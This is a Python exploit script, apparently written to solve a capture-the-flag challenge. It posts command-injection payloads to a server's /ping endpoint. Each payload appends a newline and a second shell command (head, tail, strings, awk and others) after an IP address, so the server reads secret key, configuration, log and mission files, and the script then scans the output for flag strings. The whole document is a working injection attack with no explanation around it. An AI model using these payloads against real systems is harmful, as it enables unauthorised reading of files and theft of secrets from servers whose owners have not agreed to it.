import requests
import urllib.parse
import json
import time

# Target URL
BASE_URL = "http://chall_citadel.cryptonitemit.in:32772"
PING_ENDPOINT = f"{BASE_URL}/ping"

def send_payload(payload):
    """Send a payload to the ping endpoint"""
    try:
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Prepare the request
        headers = {
            'Content-Type': 'application/json',
        }
        data = {
            'target': encoded_payload
        }
        
        # Send POST request
        response = requests.post(PING_ENDPOINT, json=data, headers=headers, timeout=10)
        
        return response.json()
    except requests.exceptions.Timeout:
        return {'error': 'Request timed out'}
    except Exception as e:
        return {'error': str(e)}

def print_result(payload_name, payload, result):
    """Pretty print the results"""
    print("\n" + "="*80)
    print(f"PAYLOAD: {payload_name}")
    print(f"Command: {payload}")
    print("-"*80)
    
    if 'output' in result:
        print(result['output'])
    elif 'error' in result:
        print(f"ERROR: {result['error']}")
    else:
        print(json.dumps(result, indent=2))
    
    print("="*80)

def main():

    
    # Define payloads to test - TARGET THE BLACKSITE KEY!
    payloads = [
        # READ THE BLACKSITE KEY - THIS IS THE FLAG!
        ("READ BLACKSITE KEY!", "8.8.8.8\nhead /var/lib/aethercorp/archive/.secrets/blacksite_key.dat"),
        ("READ with tail", "8.8.8.8\ntail /var/lib/aethercorp/archive/.secrets/blacksite_key.dat"),
        ("READ with more", "8.8.8.8\nmore /var/lib/aethercorp/archive/.secrets/blacksite_key.dat"),
        ("READ with nl", "8.8.8.8\nnl /var/lib/aethercorp/archive/.secrets/blacksite_key.dat"),
        ("READ with strings", "8.8.8.8\nstrings /var/lib/aethercorp/archive/.secrets/blacksite_key.dat"),
        ("READ with awk", "8.8.8.8\nawk '{print}' /var/lib/aethercorp/archive/.secrets/blacksite_key.dat"),
        
        # Also check all other interesting files
        ("Read VERSION", "8.8.8.8\nhead /var/lib/aethercorp/VERSION"),
        ("Read probe_config.xml", "8.8.8.8\nhead /var/lib/aethercorp/configs/probe_config.xml"),
        ("Read system_health.log", "8.8.8.8\nhead /var/lib/aethercorp/logs/system_health.log"),
        ("Read telemetry_001", "8.8.8.8\nhead /var/lib/aethercorp/cache/telemetry/telemetry_001.log"),
        ("Read telemetry_002", "8.8.8.8\nhead /var/lib/aethercorp/cache/telemetry/telemetry_002.log"),
        
        # Read all mission/report files
        ("Read mission_alpha", "8.8.8.8\nhead /var/lib/aethercorp/missions/mission_alpha.txt"),
        ("Read mission_beta", "8.8.8.8\nhead /var/lib/aethercorp/missions/mission_beta.txt"),
        ("Read report_0815", "8.8.8.8\nhead /var/lib/aethercorp/reports/report_0815.txt"),
        ("Read report_0816", "8.8.8.8\nhead /var/lib/aethercorp/reports/report_0816.txt"),
    ]
    
    # Execute each payload
    for i, (name, payload) in enumerate(payloads, 1):
        print(f"\n[{i}/{len(payloads)}] Testing: {name}")
        
        result = send_payload(payload)
        print_result(name, payload, result)
        
        # Check if we found something interesting
        if 'output' in result:
            output_lower = result['output'].lower()
            if any(keyword in output_lower for keyword in ['flag{', 'ctf{', 'blacksite', 'key:', 'aether{']):
                print("\n" + "!"*80)
                print("!!! POTENTIAL FLAG FOUND IN OUTPUT ABOVE !!!")
                print("!"*80)
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.5)
    
    print("\n\n" + "="*80)
    print("Exploitation complete!")
    print("="*80)

if __name__ == "__main__":
    main()